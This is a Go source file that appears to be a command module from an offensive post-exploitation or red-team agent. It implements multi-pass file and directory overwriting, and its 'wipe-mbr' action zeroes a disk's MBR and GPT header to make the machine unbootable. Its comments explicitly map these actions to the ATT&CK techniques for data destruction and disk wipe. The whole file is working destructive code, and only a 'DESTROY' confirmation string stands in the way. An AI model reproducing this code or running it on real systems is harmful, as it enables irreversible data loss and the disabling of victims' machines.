package commands

import (
	"crypto/rand"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"

	"fawkes/pkg/structs"
)

// SecureDeleteCommand implements secure file deletion with overwrite
type SecureDeleteCommand struct{}

func (c *SecureDeleteCommand) Name() string {
	return "secure-delete"
}

func (c *SecureDeleteCommand) Description() string {
	return "Securely delete files by overwriting with random data before removal"
}

type secureDeleteArgs struct {
	Action  string `json:"action"`  // delete, wipe, wipe-mbr
	Path    string `json:"path"`
	Passes  int    `json:"passes"`  // number of overwrite passes (default 3 for delete, 7 for wipe)
	Confirm string `json:"confirm"` // safety gate for wipe/wipe-mbr ("DESTROY")
}

const secureDeleteDefaultPasses = 3

func (c *SecureDeleteCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[secureDeleteArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.Path == "" {
		return errorResult("Error: path is required")
	}

	if args.Action == "wipe" {
		return secureWipe(args)
	}
	if args.Action == "wipe-mbr" {
		return secureWipeMBR(args)
	}

	if args.Passes <= 0 {
		args.Passes = secureDeleteDefaultPasses
	}

	info, err := os.Lstat(args.Path)
	if err != nil {
		return errorf("Error: %v", err)
	}

	if info.IsDir() {
		count, errs := secureDeleteDir(args.Path, args.Passes)
		output := fmt.Sprintf("[+] Securely deleted directory: %s (%d files, %d passes per file)", args.Path, count, args.Passes)
		if len(errs) > 0 {
			output += fmt.Sprintf("\n[!] %d errors encountered:", len(errs))
			for _, e := range errs {
				output += fmt.Sprintf("\n    - %s", e)
			}
		}
		return successResult(output)
	}

	size := info.Size()
	if err := secureDeleteFile(args.Path, size, args.Passes); err != nil {
		return errorf("Error securely deleting file: %v", err)
	}

	return successf("[+] Securely deleted: %s (%s, %d passes)", args.Path, formatFileSize(size), args.Passes)
}

// secureWipe performs aggressive data destruction with patterned overwrites (T1485).
// Pattern: zeros → ones → alternating → random (repeated for configured passes).
// This is intentionally destructive and requires confirmation.
func secureWipe(args secureDeleteArgs) structs.CommandResult {
	if args.Confirm != "DESTROY" {
		return errorResult("Error: wipe requires -confirm DESTROY (safety gate for data destruction)")
	}

	passes := args.Passes
	if passes <= 0 {
		passes = 7 // default: 7 passes for wipe (more aggressive than standard 3)
	}

	info, err := os.Lstat(args.Path)
	if err != nil {
		return errorf("Error: %v", err)
	}

	if info.IsDir() {
		count, errs := secureWipeDir(args.Path, passes)
		output := fmt.Sprintf("[+] Wiped directory: %s (%d files, %d passes per file, zeros+ones+random pattern)", args.Path, count, passes)
		if len(errs) > 0 {
			output += fmt.Sprintf("\n[!] %d errors encountered:", len(errs))
			for _, e := range errs {
				output += fmt.Sprintf("\n    - %s", e)
			}
		}
		return successResult(output)
	}

	size := info.Size()
	if err := secureWipeFile(args.Path, size, passes); err != nil {
		return errorf("Error wiping file: %v", err)
	}

	return successf("[+] Wiped: %s (%s, %d passes, zeros+ones+random pattern)", args.Path, formatFileSize(size), passes)
}

// secureWipeFile overwrites a file with patterned data then removes it.
// Pattern per pass cycle: zeros, ones (0xFF), alternating (0xAA), random.
func secureWipeFile(path string, size int64, passes int) error {
	patterns := []byte{0x00, 0xFF, 0xAA} // zeros, ones, alternating

	for i := 0; i < passes; i++ {
		f, err := os.OpenFile(path, os.O_WRONLY, 0)
		if err != nil {
			return fmt.Errorf("open for wipe pass %d: %w", i+1, err)
		}

		remaining := size
		buf := make([]byte, 32768)

		// Alternate between pattern fills and random fills
		patternIdx := i % (len(patterns) + 1) // 0=zeros, 1=ones, 2=alternating, 3=random

		for remaining > 0 {
			n := int64(len(buf))
			if n > remaining {
				n = remaining
			}

			if patternIdx < len(patterns) {
				// Pattern fill
				for j := int64(0); j < n; j++ {
					buf[j] = patterns[patternIdx]
				}
			} else {
				// Random fill
				if _, err := rand.Read(buf[:n]); err != nil {
					f.Close()
					return fmt.Errorf("generate random data: %w", err)
				}
			}

			if _, err := f.Write(buf[:n]); err != nil {
				f.Close()
				return fmt.Errorf("wipe pass %d: %w", i+1, err)
			}
			remaining -= n
		}

		if err := f.Sync(); err != nil {
			f.Close()
			return fmt.Errorf("sync pass %d: %w", i+1, err)
		}

		// Seek back to beginning for next pass
		if _, err := f.Seek(0, 0); err != nil {
			f.Close()
			return fmt.Errorf("seek pass %d: %w", i+1, err)
		}

		if err := f.Close(); err != nil {
			return fmt.Errorf("close pass %d: %w", i+1, err)
		}
	}

	return os.Remove(path)
}

// secureWipeDir recursively wipes all files in a directory
func secureWipeDir(dirPath string, passes int) (int, []string) {
	var count int
	var errs []string

	_ = filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s: %v", path, err))
			return nil
		}
		if d.IsDir() {
			return nil
		}
		info, infoErr := d.Info()
		if infoErr != nil {
			errs = append(errs, fmt.Sprintf("%s: %v", path, infoErr))
			return nil
		}
		if err := secureWipeFile(path, info.Size(), passes); err != nil {
			errs = append(errs, fmt.Sprintf("%s: %v", path, err))
		} else {
			count++
		}
		return nil
	})

	os.RemoveAll(dirPath)
	return count, errs
}

// secureDeleteFile overwrites a file with random data then removes it
func secureDeleteFile(path string, size int64, passes int) error {
	for i := 0; i < passes; i++ {
		f, err := os.OpenFile(path, os.O_WRONLY, 0)
		if err != nil {
			return fmt.Errorf("open for overwrite pass %d: %w", i+1, err)
		}

		// Overwrite with random data in 32KB chunks
		remaining := size
		buf := make([]byte, 32768)
		for remaining > 0 {
			n := int64(len(buf))
			if n > remaining {
				n = remaining
			}
			if _, err := rand.Read(buf[:n]); err != nil {
				f.Close()
				return fmt.Errorf("generate random data: %w", err)
			}
			if _, err := f.Write(buf[:n]); err != nil {
				f.Close()
				return fmt.Errorf("overwrite pass %d: %w", i+1, err)
			}
			remaining -= n
		}

		if err := f.Sync(); err != nil {
			f.Close()
			return fmt.Errorf("sync pass %d: %w", i+1, err)
		}
		if err := f.Close(); err != nil {
			return fmt.Errorf("close pass %d: %w", i+1, err)
		}
	}

	return os.Remove(path)
}

// secureRemove overwrites a file with one pass of random data before removing it.
// Use this instead of os.Remove() for temp files containing sensitive data (executables,
// memory dumps, credential databases). Falls back to plain os.Remove if overwrite fails.
func secureRemove(path string) {
	info, err := os.Stat(path)
	if err != nil {
		os.Remove(path) // may already be gone
		return
	}
	if err := secureDeleteFile(path, info.Size(), 1); err != nil {
		os.Remove(path) // fallback to plain removal
	}
}

// secureWipeMBR overwrites the Master Boot Record / GPT header of a disk device
// with zeros, rendering the system unbootable (T1561 Disk Wipe). The path must
// point to a raw disk device (e.g., /dev/sda, \\.\PhysicalDrive0, /dev/rdisk0).
// Requires root/Administrator privileges. Safety gate: -confirm DESTROY.
func secureWipeMBR(args secureDeleteArgs) structs.CommandResult {
	if args.Confirm != "DESTROY" {
		return errorResult("Error: wipe-mbr requires -confirm DESTROY (safety gate — this destroys the boot record)")
	}
	if args.Path == "" {
		return errorResult("Error: path to disk device is required (e.g., /dev/sda, \\\\.\\PhysicalDrive0)")
	}

	// Open the disk device for writing
	f, err := os.OpenFile(args.Path, os.O_WRONLY, 0)
	if err != nil {
		return errorf("Error opening disk device %s: %v (requires root/Administrator)", args.Path, err)
	}
	defer f.Close()

	// Overwrite first 512 bytes (MBR) + GPT header (LBA 1, another 512 bytes)
	// Total: 1024 bytes covers both MBR and primary GPT header
	wipeSize := 1024
	zeros := make([]byte, wipeSize)

	n, err := f.Write(zeros)
	if err != nil {
		return errorf("Error writing to %s: %v (wrote %d/%d bytes)", args.Path, err, n, wipeSize)
	}

	if err := f.Sync(); err != nil {
		return errorf("Error syncing %s: %v", args.Path, err)
	}

	return successf("[+] MBR/GPT wiped: %s (%d bytes zeroed — MBR + GPT primary header destroyed)", args.Path, n)
}

// secureDeleteDir recursively securely deletes all files in a directory
func secureDeleteDir(dirPath string, passes int) (int, []string) {
	var count int
	var errs []string

	_ = filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s: %v", path, err))
			return nil
		}
		if d.IsDir() {
			return nil
		}
		info, infoErr := d.Info()
		if infoErr != nil {
			errs = append(errs, fmt.Sprintf("%s: %v", path, infoErr))
			return nil
		}
		if err := secureDeleteFile(path, info.Size(), passes); err != nil {
			errs = append(errs, fmt.Sprintf("%s: %v", path, err))
		} else {
			count++
		}
		return nil
	})

	// Remove empty directories
	os.RemoveAll(dirPath)

	return count, errs
}
